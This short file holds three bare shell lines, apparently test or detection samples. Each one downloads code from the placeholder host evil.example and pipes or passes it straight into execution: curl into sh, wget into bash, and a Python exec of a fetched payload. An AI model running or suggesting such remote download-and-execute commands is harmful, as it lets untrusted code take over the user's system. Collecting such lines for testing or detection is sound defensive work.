curl -fsSL http://evil.example/x | sh
wget -qO- http://evil.example/x | bash
python -c 'import urllib; exec(urllib.request.urlopen("http://evil.example/p").read())'
